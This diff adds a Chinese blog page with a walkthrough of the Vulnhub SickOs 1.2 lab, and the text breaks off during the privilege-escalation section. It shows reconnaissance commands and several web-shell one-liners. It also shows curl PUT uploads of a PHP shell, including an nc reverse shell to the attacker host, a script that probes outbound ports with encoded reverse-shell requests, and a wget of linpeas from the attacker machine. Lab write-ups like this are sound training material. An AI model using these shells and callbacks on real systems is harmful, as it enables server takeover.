@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-13SickOs1.2 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-13SickOs1.2</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:05:34</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>SickOs1.2</p>
+<p><code>arp-scan -l          nmap --min-rate 100000 -p- 192.168.111.132     nmap --min-rate 100000 -p22,80 -A 192.168.111.132</code></p>
+<p><img src="/vulnhub-13sickos1-2//image-20241115083158641.png" alt="image-20241115083158641">简单做完信息收集，22号端口先不管他。开始对80端口进行信息收集，dirsearch -u 192.168.111.132 	dirb  <a target="_blank" rel="noopener" href="http://192.168.111.132/">http://192.168.111.132/</a>    </p>
+<p>区别在于后者可以指定字典轻度扫描，前者是深度扫描。在扫描速度上dirb&gt;dirsearch 在扫描深度上dirb&lt;dirsearch</p>
+<p>nikto -host 192.168.111.132 -p 80看下80端口具体有什么</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 1：普通扫描</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">nikto</span> -h 目标实例：nikto -h <span class="number">192.168.50.11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 2:扫描指定端口</span></span><br><span class="line"></span><br><span class="line">nikto -h <span class="number">192.168.0.1</span> -p <span class="number">443</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 3:目录猜解</span></span><br><span class="line"></span><br><span class="line">-C 指定CGI目录 –all表示猜解CGI目录</span><br><span class="line"></span><br><span class="line">nikto -h <span class="number">192.168.3.111</span> -C all </span><br><span class="line"></span><br><span class="line"><span class="comment">## 4:漏洞扫描</span></span><br><span class="line"></span><br><span class="line">-T选项包含很多小选项 –T <span class="number">9</span>表示扫描SQL注入漏洞</span><br><span class="line"></span><br><span class="line">-T选项包含的小选项解释：</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>检查文件上传页面</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> 检查web日志   nikto -h <span class="number">192.168.111.132</span> -T <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>检查错误配置或默认文件  nikto -h <span class="number">192.168.111.132</span> -T <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>检查信息泄露问题  nikto -h <span class="number">192.168.111.132</span> -T <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span> 检查[XSS](https://so.csdn.net/so/search?q=XSS&amp;spm=1001.2101.3001.7020)/Script/HTML问题   nikto -h <span class="number">192.168.111.132</span> -T <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span> 从根目录检查是否存在可访问的文件  nikto -h <span class="number">192.168.111.132</span> -T <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>检查拒绝服务问题   nikto -h <span class="number">192.168.111.132</span> -T <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>从任意文件检索是否存在可访问文件  nikto -h <span class="number">192.168.111.132</span> -T <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span> 检查是否存在系统命令执行漏洞  nikto -h <span class="number">192.168.111.132</span> -T <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="number">9</span> 检查SQL注入漏洞  nikto -h <span class="number">192.168.111.132</span> -T <span class="number">9</span></span><br><span class="line"></span><br><span class="line">-a 检查认证绕过问题  nikto -h <span class="number">192.168.111.132</span> -a</span><br><span class="line"></span><br><span class="line">-b 识别安装的软件版本  nikto -h <span class="number">192.168.111.132</span> -b</span><br><span class="line"></span><br><span class="line">-c 检查源代码泄露问题  nikto -h <span class="number">192.168.111.132</span> -c</span><br><span class="line"></span><br><span class="line">-x 反向链接选项  nikto -h <span class="number">192.168.111.132</span> -x</span><br></pre></td></tr></table></figure>
+
+<p>在dirsearch扫描到一个目录&#x2F;test&#x2F;，网站是基于Lighttpd  Lighttpd是一个德国人领导的<a target="_blank" rel="noopener" href="https://edu.csdn.net/cloud/pm_summit?utm_source=blogglc">开源</a>软件,其根本的目的是提供一个专门针对高性能网站,安全、快速、兼容性好并且灵活的web server环境。具有非常低的内存开销,cpu占用率低,效能好,以及丰富的模块等特点。这里看到版本是1.4.28 尝试搜索相关漏洞</p>
+<p><img src="/vulnhub-13sickos1-2//image-20241115085048736.png" alt="image-20241115085048736"></p>
+<p><img src="/vulnhub-13sickos1-2//image-20241115085334950.png" alt="image-20241115085334950"></p>
+<p><img src="/vulnhub-13sickos1-2//image-20241115085602775.png" alt="image-20241115085602775"></p>
+<p>根据漏洞的payload不能发现敏感信息，目前只能从&#x2F;test&#x2F;入手了，nmap –min-rate 100000 192.168.111.132 –script&#x3D;http-methods.nse –script-args&#x3D;http.methods.url-path&#x3D;”&#x2F;test” 扫描&#x2F;test页面的支持的http方法   </p>
+<p><img src="/vulnhub-13sickos1-2//image-20241115091129404.png" alt="image-20241115091129404"></p>
+<p>或者对&#x2F;test页面抓包,然后修改请求头为OPTIONS查看支持的HTTP方法  发现是存在PUT方法的，那么尝试传入一句话</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP格式<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span>   <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>:代码写在这里面才会被服务器认为是php代码，然后才会按php的格式解析</span><br><span class="line">@：这个符号的意思是不报错，即便是这里面的代码执行出错也不会报错，如果没有这个符号一旦语句有错误就会使用不了</span><br><span class="line"><span class="keyword">eval</span>()函数：把函数里面的字符串作为PHP代码执行</span><br><span class="line"><span class="variable">$_POST</span>[]:意思就是在这个中括号里面的内容使用POST的方法进行接收，在PHP里面不仅有POST还有GET、REQUSET等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ASP格式<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span>   <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line">JSP格式</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(request.<span class="title function_ invoke__">getParameter</span>(“f”)!=<span class="literal">null</span>)(<span class="keyword">new</span> java.io.<span class="title function_ invoke__">FileOutputStream</span>(application.<span class="title function_ invoke__">getRealPath</span>(<span class="string">&quot;&quot;</span>)+request.<span class="title function_ invoke__">getParameter</span>(“f”))).<span class="title function_ invoke__">write</span>(request.<span class="title function_ invoke__">getParameter</span>(“t”).<span class="title function_ invoke__">getBytes</span>());</span><br><span class="line">%&gt;</span><br><span class="line">ASPX格式</span><br><span class="line">&lt;%@ Page Language=“Jscript”%&gt; &lt;%<span class="keyword">eval</span>(Request.Item[“pass”],“unsafe”);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-13sickos1-2//image-20241115092506078.png" alt="image-20241115092506078"></p>
+<p>这里需要的是稳定的shell，直接反弹shell，在kali上操作这里直接反弹连接不上，估计是开了防火墙，限制了出网那就，换个思路</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">curl -v -X PUT -d &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; http://192.168.111.132/test/shell.php</span></span><br><span class="line"><span class="language-xml">curl -v -X PUT -d &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;mkfifo /tmp/f; nc 192.168.111.128 1111 0&lt;/tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f&quot;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; http://192.168.111.132/test/f.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-13sickos1-2//image-20241115093207185.png" alt="image-20241115093207185"></p>
+<p>弹了半天，都弹不上，猜测是站点设置了出口限制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 靶机ip</span></span><br><span class="line">target_ip=<span class="string">&quot;192.168.111.132&quot;</span></span><br><span class="line"><span class="comment"># 攻击者ip</span></span><br><span class="line">callback_ip=<span class="string">&quot;192.168.111.128&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击者机器的临时监听文件</span></span><br><span class="line">output_file=<span class="string">&quot;/tmp/nc_output&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> $(<span class="built_in">seq</span> 8078 65535);<span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[*] Scanning <span class="variable">$&#123;port&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$output_file</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;[*] <span class="variable">$output_file</span> exists, Deleting it...&quot;</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt;  <span class="string">&quot;<span class="variable">$output_file</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;[*] <span class="variable">$output_file</span> does not exist.&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">touch</span> <span class="string">&quot;<span class="variable">$output_file</span>&quot;</span>; nc -nvlp <span class="variable">$&#123;port&#125;</span> &gt; <span class="string">&quot;<span class="variable">$output_file</span>&quot;</span> 2&gt;&amp;1 &amp;</span><br><span class="line">        nc_pid=$!</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[*] nc_pid is <span class="variable">$nc_pid</span>&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 1</span><br><span class="line"></span><br><span class="line">        reverse_shell=<span class="string">&quot;nc <span class="variable">$&#123;callback_ip&#125;</span> <span class="variable">$&#123;port&#125;</span>&quot;</span></span><br><span class="line">        encoded_shell=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$reverse_shell</span>&quot;</span> | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        request_url=<span class="string">&quot;http://<span class="variable">$&#123;target_ip&#125;</span>/test/1.php?a=echo%20%22<span class="variable">$&#123;encoded_shell&#125;</span>%22%20|%20base64%20-d%20|%20bash&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[*] Sending request to <span class="variable">$&#123;request_url&#125;</span>&quot;</span></span><br><span class="line">        curl --max-time 1 -s <span class="string">&quot;<span class="variable">$&#123;request_url&#125;</span>&quot;</span></span><br><span class="line">        result=$(<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$output_file</span>&quot;</span> | grep connect)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># echo &quot;$result&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$result</span>&quot;</span> != <span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;[!] This port <span class="variable">$&#123;port&#125;</span> can reach.&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;[*] This port <span class="variable">$&#123;port&#125;</span> can not reach.&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># if grep -q &quot;connect&quot; &quot;$output_file&quot;; then</span></span><br><span class="line">        <span class="comment">#       echo &quot;[*] The port can reach&quot;</span></span><br><span class="line">        <span class="comment"># fi</span></span><br><span class="line">        <span class="built_in">sleep</span> 1</span><br><span class="line">        nc_process=$(ps aux | grep <span class="string">&quot;<span class="variable">$nc_pid</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$nc_process</span>&quot;</span> != <span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;[*] The <span class="variable">$&#123;nc_pid&#125;</span> is running, kill it.&quot;</span></span><br><span class="line">                <span class="built_in">kill</span> <span class="string">&quot;<span class="variable">$nc_pid</span>&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[*] Port scanning and reverse shell requests completed.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><blockquote>
+<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">信息收集：</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">sudo -l：没有权限</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">cat /etc/crontab：没有任何计划任务</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">find / -perm -u=s -type f <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span>：没有可利用的suid文件</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">内核漏洞searchsploit，没有适合的漏洞利用</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">敏感信息收集：发现用户很少，私人信息也很少，不可利用</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">但是linux仍然可能存在提权漏洞，我们需要使用工具linpeas扫描</span></span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">这就是我们扫描防火墙的优势，因为我们可以请求攻击机器<span class="number">8080</span>端口获取linpeas.<span class="property">sh</span>脚本</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">攻击机器：python3 -m http.<span class="property">server</span> <span class="number">8080</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">靶机：wget <span class="attr">http</span>:<span class="comment">//192.168.148.47:8080/linpeas.sh</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">执行./linpeas.<span class="property">sh</span>，我们将获取到足够多的信息，以及足够多的漏洞，其中这样的一个漏洞引人注目：</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">[+] [<span class="variable constant_">CVE</span>-<span class="number">2014</span>-<span class="number">0476</span>] chkrootkit</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">   <span class="title class_">Details</span>: <span class="attr">http</span>:<span class="comment">//seclists.org/oss-sec/2014/q2/430</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">   <span class="title class_">Exposure</span>: less probable</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">   <span class="title class_">Download</span> <span class="attr">URL</span>: <span class="attr">https</span>:<span class="comment">//www.exploit-db.com/download/33899</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">   <span class="title class_">Comments</span>: <span class="title class_">Rooting</span> depends on the <span class="title function_">crontab</span> (up to one day <span class="keyword">of</span> delay)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">它不是内核漏洞，但需要依赖crontab</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">我们进入它的利用文章查看即可</span></span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">exp是个txt文件，以下是对exp的翻译：</span></span><br><span 